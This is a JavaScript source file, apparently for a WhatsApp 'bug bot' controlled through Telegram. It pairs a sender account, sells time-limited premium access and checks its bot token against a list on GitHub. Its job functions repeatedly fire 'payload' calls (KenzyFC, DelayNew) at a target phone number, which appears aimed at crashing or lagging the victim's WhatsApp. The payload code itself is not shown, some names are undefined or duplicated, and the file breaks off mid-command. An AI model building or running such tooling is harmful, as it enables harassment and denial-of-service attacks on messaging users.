// PROJECT BY @Xerozzz_Reals #NO APUS CREDIT 

const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const mongoose = require("mongoose");
const { BOT_TOKEN, ID_TELEGRAM } = require("./config");
const adminFile = './database/adminuser.json';
const FormData = require("form-data");
const https = require("https");
function fetchJsonHttps(url, timeout = 5000) {
  return new Promise((resolve, reject) => {
    try {
      const req = https.get(url, { timeout }, (res) => {
        const { statusCode } = res;
        if (statusCode < 200 || statusCode >= 300) {
          let _ = '';
          res.on('data', c => _ += c);
          res.on('end', () => reject(new Error(`HTTP ${statusCode}`)));
          return;
        }
        let raw = '';
        res.on('data', (chunk) => (raw += chunk));
        res.on('end', () => {
          try {
            const json = JSON.parse(raw);
            resolve(json);
          } catch (err) {
            reject(new Error('Invalid JSON response'));
          }
        });
      });
      req.on('timeout', () => {
        req.destroy(new Error('Request timeout'));
      });
      req.on('error', (err) => reject(err));
    } catch (err) {
      reject(err);
    }
  });
}
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  encodeSignedDeviceIdentity,
  encodeWAMessage,
  jidEncode,
  patchMessageBeforeSending,
  encodeNewsletterMessage,
  BufferJSON,
  DisconnectReason,
  proto,
} = require('@bellachu/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 50) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

// ------ ( Link Raw Github ) ------ //
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/xyenz14115/Xyenz/refs/heads/main/tokens.json";

// ------ ( Create Safe Sock ) ------ //
function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

// ------ ( Pengecekan Token ) ------ //
async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);

    if (Array.isArray(response.data)) {
      return response.data;
    }

    if (Array.isArray(response.data.tokens)) {
      return response.data.tokens;
    }

    const raw = JSON.stringify(response.data || "");
    const extracted = raw.match(/\d{5,}:[A-Za-z0-9_\-]{20,}/g);

    return extracted || [];
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.green("🔍 Memeriksa token anda"));

  let validTokens = await fetchValidTokens();

  if (!Array.isArray(validTokens)) {
    validTokens = [];
  }

  const tokenList = validTokens.map(t => String(t).trim());

  // Normalisasi token BOT lu
  const normalizedBotToken = String(BOT_TOKEN).trim();

  // cek token
  if (!tokenList.includes(normalizedBotToken)) {
    console.log(chalk.red(`
⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢰⣿⢤⡿⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⡿⠀⠀⠀⢬⡱⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣷⠀⠀⠀⠀⠙⣦⠙⠦⠤⠴⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⣧⠀⠀⠀⠀⠘⣿⠓⠶⣄⡈⣻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢠⡤⣿⣷⠀⠀⠀⠀⣻⣄⡀⠀⠁⣬⡟⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠈⢧⣈⠉⡀⠀⠀⠀⡈⠻⣿⣿⣇⠈⡇⣿⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠙⢿⡆⠀⠀⣼⠀⢹⡙⢿⣆⠀⢻⣿⣻⣿⣿⢿⣿⡶⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⡾⡄⣰⣿⡆⠀⠙⣦⠹⡆⠰⣿⠛⢿⣿⣞⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢐⣿⠇⣟⠋⢸⣿⣼⠀⣿⣷⣼⡹⣾⡆⠈⢿⣿⣛⣒⠂⠀⠀⠀⠀
⠀⠀⠀⣚⣻⣿⣶⣿⠀⠈⡛⢿⡀⢸⣿⢛⣿⣿⢹⠀⠀⠉⠛⢻⡿⠁⠀⠀⠀
⣀⣀⣉⣩⣿⣿⣿⠋⠀⠀⡇⠈⢓⠏⠏⡀⢸⠇⢈⣷⣄⠀⢲⣸⠀⠀⠀⠀⠀
⢀⠉⠛⣛⣛⡛⠁⠀⠀⣾⠃⠀⣸⠇⣠⡇⢠⡀⠈⢿⡻⣦⠈⢻⣦⣀⡀⠀⠀
⠈⠙⠛⣿⣶⡾⠛⣡⣾⡟⢠⣾⣿⣿⣟⡤⠀⣷⡀⢨⣿⣽⡄⢀⣿⣿⣿⠇⠀
⠀⢠⣾⡟⢁⣴⡿⠹⠋⡰⣿⣿⣿⣿⡟⠀⢀⣿⣇⣼⣿⡿⡇⠞⣿⣿⣧⣤⡤
⠀⢠⡾⠚⣿⡟⢀⣴⠏⣸⣿⣿⣿⣿⣧⢰⣿⣿⡿⢻⠉⠀⡔⢶⣽⣿⠿⠥⠀
⠀⠈⠀⢸⠟⣠⡾⠏⠀⡿⢹⣿⣿⣿⣿⣿⣿⣿⣶⣿⣶⣾⣿⣮⣍⠉⠙⢲⠄
⠀⠀⠀⠘⠉⠁⠀⠀⢸⠁⠘⣿⡿⠻⣿⡿⣿⣿⣿⣿⣿⣿⡏⢻⣛⠛⠒⠛⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⠀⠈⢻⡄⠹⣿⣿⡇⠙⢷⡈⢿⡟⠒⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⠀⣿⣿⠃⠀⠀⠀⣿⠇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠃⠀⠀⠀⠈⠋⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠁⠀⠀⠀⠀⠀⠀
⬡═―—―――――――――――――—═⬡⠀⠀⠀
❌ Akses Telah Di Tolak ❌
Alasan : Bot Token Belum terdaftar 
⬡═―—―――――――――――――—═⬡⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀
`));
    process.exit(1);
  }

  console.log(chalk.green(`✅ Alhamdulillah, token valid!`));
  startBot();
}



function startBot() {
  console.log(chalk.green(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧⠀
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋⠀
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋⠀⠀⠀
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀⠀⠀⠀⠀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀⢄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀
`));
console.log(chalk.yellow(`
⬡═―—――――――――――――—═⬡⠀⠀⠀
⌑ Status Bot : Connected 
⌑ Version : 1.0 - Project
⌑ Developer : @xyenzzx⠀
⬡═―—――――――――――――—═⬡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
`));
}
validateToken();

//----------(FORMAT TARGET)-------------//
function formatTarget(number) {
  if (!number) return null;

  // bersihin selain angka
  number = number.replace(/[^0-9]/g, "");

  if (number.startsWith("0")) {
    number = "62" + number.slice(1);
  }

  return number + "@s.whatsapp.net";
}

//------------------(TASK QUE SYSTEM)--------------------//
class TaskQueue {
  constructor() {
    this.queue = [];
    this.running = false;
  }

  async add(task) {
    this.queue.push(task);
    this.run();
  }

  async run() {
    if (this.running) return;
    this.running = true;

    while (this.queue.length > 0) {
      const job = this.queue.shift();
      try {
        await job();
      } catch (e) {
        console.error("Task error:", e);
      }
    }

    this.running = false;
  }
}

const queue = new TaskQueue();

//------------------(FILTER - BEBAS SPAM)--------------------//
async function Xyenz001(ctx, target) {
  const taskId = Date.now().toString().slice(-6);
  const delay = 3000;
  const totalLoops = 6; // Variabel biar gampang ubahnya cuma di satu tempat

  const C = {
    reset: "\x1b[0m",
    bold: "\x1b[1m",
    green: "\x1b[32m",
    red: "\x1b[31m",
    cyan: "\x1b[36m",
    gray: "\x1b[90m"
  };

  const startTime = Date.now();

  // Header Simple
  console.log(`${C.cyan}${C.bold}[#] JOB TELAH DITERIMA | ID: ${taskId}${C.reset}`);
  console.log(`${C.gray}Target: ${target}${C.reset}`);

  for (let i = 1; i <= totalLoops; i++) {
    const loopStart = Date.now();

    try {
      // Pastikan fungsi epcihDiley sudah terdefinisi di tempat lain
      await KenzyFC(sock, target);

      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);
      console.log(`${C.green}✓${C.reset} Payload Berhasil Loop ${i}/${totalLoops} ${C.gray}(${duration}s)${C.reset}`);

    } catch (err) {
      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);
      console.log(`${C.red}✗${C.reset} Payload Gagal Loop ${i}/${totalLoops} ${C.gray}(${duration}s)${C.reset} ${C.red}err:${C.reset} ${err.message}`);
    }

    if (i < totalLoops) await new Promise(r => setTimeout(r, delay));
  }

  const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);
  console.log(`${C.cyan}${C.bold}[!] JOB TELAH SELESAI | Time: ${totalTime}s${C.reset}\n`);
}

async function DelayUiStackHomeByMia(ctx, target) {
  const taskId = Date.now().toString().slice(-6);
  const delay = 3000;
  const totalLoops = 6; // Variabel biar gampang ubahnya cuma di satu tempat

  const C = {
    reset: "\x1b[0m",
    bold: "\x1b[1m",
    green: "\x1b[32m",
    red: "\x1b[31m",
    cyan: "\x1b[36m",
    gray: "\x1b[90m"
  };

  const startTime = Date.now();

  // Header Simple
  console.log(`${C.cyan}${C.bold}[#] JOB TELAH DITERIMA | ID: ${taskId}${C.reset}`);
  console.log(`${C.gray}Target: ${target}${C.reset}`);

  for (let i = 1; i <= totalLoops; i++) {
    const loopStart = Date.now();

    try {
      // Pastikan fungsi epcihDiley sudah terdefinisi di tempat lain
      await DelayNew(sock, target);

      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);
      console.log(`${C.green}✓${C.reset} Payload Berhasil Loop ${i}/${totalLoops} ${C.gray}(${duration}s)${C.reset}`);

    } catch (err) {
      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);
      console.log(`${C.red}✗${C.reset} Payload Gagal Loop ${i}/${totalLoops} ${C.gray}(${duration}s)${C.reset} ${C.red}err:${C.reset} ${err.message}`);
    }

    if (i < totalLoops) await new Promise(r => setTimeout(r, delay));
  }

  const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);
  console.log(`${C.cyan}${C.bold}[!] JOB TELAH SELESAI | Time: ${totalTime}s${C.reset}\n`);
}

async function Xyenz002(ctx, target) {
  const taskId = Date.now().toString().slice(-6);
  const delay = 3000;
  const totalLoops = 6; // Variabel biar gampang ubahnya cuma di satu tempat

  const C = {
    reset: "\x1b[0m",
    bold: "\x1b[1m",
    green: "\x1b[32m",
    red: "\x1b[31m",
    cyan: "\x1b[36m",
    gray: "\x1b[90m"
  };

  const startTime = Date.now();

  // Header Simple
  console.log(`${C.cyan}${C.bold}[#] JOB TELAH DITERIMA | ID: ${taskId}${C.reset}`);
  console.log(`${C.gray}Target: ${target}${C.reset}`);

  for (let i = 1; i <= totalLoops; i++) {
    const loopStart = Date.now();

    try {
      // Pastikan fungsi epcihDiley sudah terdefinisi di tempat lain
      await KenzyFC(sock, target);

      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);
      console.log(`${C.green}✓${C.reset} Payload Berhasil Loop ${i}/${totalLoops} ${C.gray}(${duration}s)${C.reset}`);

    } catch (err) {
      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);
      console.log(`${C.red}✗${C.reset} Payload Gagal Loop ${i}/${totalLoops} ${C.gray}(${duration}s)${C.reset} ${C.red}err:${C.reset} ${err.message}`);
    }

    if (i < totalLoops) await new Promise(r => setTimeout(r, delay));
  }

  const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);
  console.log(`${C.cyan}${C.bold}[!] JOB TELAH SELESAI | Time: ${totalTime}s${C.reset}\n`);
}

async function Xyen(ctx, target) {
  const taskId = Date.now().toString().slice(-6);
  const delay = 3000;
  const totalLoops = 6; // Variabel biar gampang ubahnya cuma di satu tempat

  const C = {
    reset: "\x1b[0m",
    bold: "\x1b[1m",
    green: "\x1b[32m",
    red: "\x1b[31m",
    cyan: "\x1b[36m",
    gray: "\x1b[90m"
  };

  const startTime = Date.now();

  // Header Simple
  console.log(`${C.cyan}${C.bold}[#] JOB TELAH DITERIMA | ID: ${taskId}${C.reset}`);
  console.log(`${C.gray}Target: ${target}${C.reset}`);

  for (let i = 1; i <= totalLoops; i++) {
    const loopStart = Date.now();

    try {
      // Pastikan fungsi epcihDiley sudah terdefinisi di tempat lain
      await DelayNew(sock, target);

      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);
      console.log(`${C.green}✓${C.reset} Payload Berhasil Loop ${i}/${totalLoops} ${C.gray}(${duration}s)${C.reset}`);

    } catch (err) {
      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);
      console.log(`${C.red}✗${C.reset} Payload Gagal Loop ${i}/${totalLoops} ${C.gray}(${duration}s)${C.reset} ${C.red}err:${C.reset} ${err.message}`);
    }

    if (i < totalLoops) await new Promise(r => setTimeout(r, delay));
  }

  const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);
  console.log(`${C.cyan}${C.bold}[!] JOB TELAH SELESAI | Time: ${totalTime}s${C.reset}\n`);
}

async function Xyen(ctx, target) {
  const taskId = Date.now().toString().slice(-6);
  const delay = 3000;
  const totalLoops = 6; // Variabel biar gampang ubahnya cuma di satu tempat

  const C = {
    reset: "\x1b[0m",
    bold: "\x1b[1m",
    green: "\x1b[32m",
    red: "\x1b[31m",
    cyan: "\x1b[36m",
    gray: "\x1b[90m"
  };

  const startTime = Date.now();

  // Header Simple
  console.log(`${C.cyan}${C.bold}[#] JOB TELAH DITERIMA | ID: ${taskId}${C.reset}`);
  console.log(`${C.gray}Target: ${target}${C.reset}`);

  for (let i = 1; i <= totalLoops; i++) {
    const loopStart = Date.now();

    try {
      // Pastikan fungsi epcihDiley sudah terdefinisi di tempat lain
      await DelayNew(sock, target);

      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);
      console.log(`${C.green}✓${C.reset} Payload Berhasil Loop ${i}/${totalLoops} ${C.gray}(${duration}s)${C.reset}`);

    } catch (err) {
      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);
      console.log(`${C.red}✗${C.reset} Payload Gagal Loop ${i}/${totalLoops} ${C.gray}(${duration}s)${C.reset} ${C.red}err:${C.reset} ${err.message}`);
    }

    if (i < totalLoops) await new Promise(r => setTimeout(r, delay));
  }

  const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);
  console.log(`${C.cyan}${C.bold}[!] JOB TELAH SELESAI | Time: ${totalTime}s${C.reset}\n`);
}

const bot = new Telegraf(BOT_TOKEN);
let tokenValidated = false;
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const startSesi = async () => {
console.clear();
    console.log(chalk.cyan(`
─────────────────────
DEVELOPER : @xyenzzx
VERSION : 4.0 
SYSTEM : MONGODB 
STATUS : ACTIVE/TERHUBUNG
─────────────────────
`));
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '5.15.7'],
        getMessage: async (key) => ({
            conversation: 'Apophis',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `\`\`\`JS
⬡═―—⊱ ⎧ ADD PAIRING ⎭ ⊰―—═⬡
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Connected
╘—————————————————═⬡\`\`\``;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "Markdown" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.green(`PAIRING SENDER BERHASIL ✅`));
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();


bot.command("addbot", async (ctx) => {
   if (ctx.from.id != ID_TELEGRAM) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /addbot 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "1234VVIP");
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `\`\`\`JS
⬡═―—⊱ ⎧ ADD PAIRING ⎭ ⊰―—═⬡
⌑ Number: ${phoneNumber}
⌑ Pairing Code: ${formattedCode}
⌑ Type: Not Connected
╘═——————————————═⬡
\`\`\``;

    const sentMsg = await ctx.replyWithPhoto(FotoUtama, {  
      caption: pairingMenu,  
      parse_mode: "Markdown"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `\`\`\`JS
 ⬡═―—⊱ ⎧ ADD PAIRING ⎭ ⊰―—═⬡
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Connected
╘═——————————————═⬡\`\`\`
`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "Markdown" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

// ------ ( Function RunTime ) ------ //
function runtime(seconds) {
  seconds = Number(seconds);

  const d = Math.floor(seconds / (3600 * 24));
  const h = Math.floor((seconds % (3600 * 24)) / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = Math.floor(seconds % 60);

  const parts = [];
  if (d > 0) parts.push(`${d}d`);
  if (h > 0) parts.push(`${h}h`);
  if (m > 0) parts.push(`${m}m`);
  parts.push(`${s}s`);

  return parts.join(" ");
}

// ------ ( Setup File Premium ) ------ //
const PREMIUM_FILE = "./premium.json";

function loadPremium() {
  if (!require("fs").existsSync(PREMIUM_FILE)) {
    require("fs").writeFileSync(PREMIUM_FILE, JSON.stringify({}, null, 2));
  }
  return JSON.parse(require("fs").readFileSync(PREMIUM_FILE));
}

function savePremium(data) {
  require("fs").writeFileSync(PREMIUM_FILE, JSON.stringify(data, null, 2));
}

let premiumDB = loadPremium();

// ------ ( Setup File Admin ) ------ //
const ADMIN_FILE = "./admin.json";

function loadAdmin() {
  if (!require("fs").existsSync(ADMIN_FILE)) {
    require("fs").writeFileSync(ADMIN_FILE, JSON.stringify({}, null, 2));
  }
  return JSON.parse(require("fs").readFileSync(ADMIN_FILE));
}

function saveAdmin(data) {
  require("fs").writeFileSync(ADMIN_FILE, JSON.stringify(data, null, 2));
}

let adminDB = loadAdmin();

// ------ ( Helper Admin ) ------ //
function isAdmin(userId) {
  return !!adminDB[userId];
}

function addAdmin(userId) {
  adminDB[userId] = true;
  saveAdmin(adminDB);
}

function delAdmin(userId) {
  delete adminDB[userId];
  saveAdmin(adminDB);
}

function isOwnerOrAdmin(userId) {
  return userId == ID_TELEGRAM || isAdmin(userId);
}

// ------ ( Helper Premium ) ------ //
function isPremium(userId) {
  return !!premiumDB[userId];
}

function addPremium(userId, expired) {
  premiumDB[userId] = expired;
  savePremium(premiumDB);
}

function delPremium(userId) {
  delete premiumDB[userId];
  savePremium(premiumDB);
}

function getPremiumExpire(userId) {
  return premiumDB[userId] || null;
}

// ------ ( Format Waktu Premium ) ------ //
function addDays(days) {
  return Date.now() + days * 24 * 60 * 60 * 1000;
}

function formatDate(ms) {
  const d = new Date(ms);
  return d.toLocaleString("id-ID");
}

// ------ ( Helper Untuk Menu ) ------ //
function getPremiumStatus(userId) {
  if (!isPremium(userId)) return "No";

  const exp = getPremiumExpire(userId);

  if (Date.now() > exp) {
    delPremium(userId);
    return "Expired";
  }

  return "Active";
}

// ------ ( Auto Hapus Expired ) ------ //
setInterval(() => {
  for (let user in premiumDB) {
    if (Date.now() > premiumDB[user]) {
      delete premiumDB[user];
    }
  }
  savePremium(premiumDB);
}, 60000);

// ------ ( Helper Cek Premium ) ------ //
function checkPremium() {
  return async (ctx, next) => {
    const userId = String(ctx.from.id);
    const exp = premiumDB[userId];

    if (!exp) {
      return ctx.reply(
        `<b>ACCESS DENIED</b>\n` +
        `❌ Kamu bukan user premium`,
        { parse_mode: "HTML" }
      );
    }

    if (Date.now() > exp) {
      delete premiumDB[userId];
      savePremium(premiumDB);

      return ctx.reply(
        `<b>PREMIUM EXPIRED</b>\n` +
        `⚠️ Masa aktif kamu sudah habis`,
        { parse_mode: "HTML" }
      );
    }

    return next();
  };
}

// ------ ( Helper Check Pairing Sender ) ------ //
const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

// ------ ( Command Hapus Sesi ) ------ //
bot.command("killsesi", async (ctx) => {
  if (ctx.from.id != ID_TELEGRAM) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

// ------ ( Command Add Admin ) ------ //
bot.command("addadmin", async (ctx) => {
  try {
    if (ctx.from.id != ID_TELEGRAM) {
      return ctx.reply("❌ Hanya Owner yang bisa mengakses cmd");
    }

    const args = ctx.message.text.split(" ").slice(1);
    let targetId;

    if (ctx.message.reply_to_message) {
      targetId = ctx.message.reply_to_message.from.id;
    } else {
      targetId = args[0];
    }

    if (!targetId) {
      return ctx.reply("❌ Format: /addadmin (reply)\n/addadmin 123456");
    }

    targetId = String(targetId);

    addAdmin(targetId);

    return ctx.reply( `\`\`\`JS
✘ 𝘽𝙚𝙧𝙝𝙖𝙨𝙞𝙡 𝙈𝙚𝙣𝙖𝙢𝙗𝙖𝙝𝙠𝙖𝙣 𝘼𝙙𝙢𝙞𝙣
⸙ 𝙐𝙨𝙚𝙧 𝙏𝙖𝙧𝙜𝙚𝙩 : ${targetId}
⸙ 𝙎𝙩𝙖𝙩𝙪𝙨 : 𝙏𝙚𝙧𝙨𝙞𝙢𝙥𝙖𝙣 𝘿𝙞 𝘿𝙖𝙩𝙖𝙗𝙖𝙨𝙚 
\`\`\``,
      { parse_mode: "Markdown" }
    );

  } catch (err) {
    console.log("ADD ADMIN ERROR:", err);
    ctx.reply("❌ Error addadmin");
  }
});

// ------ ( Command Del Admin ) ------ //
bot.command("deladmin", async (ctx) => {
  try {
    if (ctx.from.id != ID_TELEGRAM) {
      return ctx.reply("❌ Hanya Owner yang bisa mengakses cmd");
    }

    const args = ctx.message.text.split(" ").slice(1);
    let targetId;

    if (ctx.message.reply_to_message) {
      targetId = ctx.message.reply_to_message.from.id;
    } else {
      targetId = args[0];
    }

    if (!targetId) {
      return ctx.reply("❌ Format:\n/deladmin (reply)\n/deladmin 123456");
    }

